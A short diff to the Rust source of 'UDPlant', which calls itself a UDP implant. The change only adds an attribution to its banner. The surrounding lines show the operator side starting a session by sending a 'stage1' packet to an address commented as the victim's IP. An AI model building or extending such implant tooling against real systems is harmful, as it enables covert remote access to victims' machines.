@@ -19,7 +19,7 @@ fn main() {
 }
 
 fn initiate(socket: &mut UdpSocket) {
-    println!("UDPlant - UDP implant made by trickster0");
+    println!("UDPlant - UDP implant made by trickster0 from Telspace Systems");
     println!("{}", "[+]Connection Initiated.".green());
     let stage1 = "int1".as_bytes();
     socket.send_to(&stage1,"0.0.0.0:33267").expect("Failed to connect on UDP."); //victim's IP
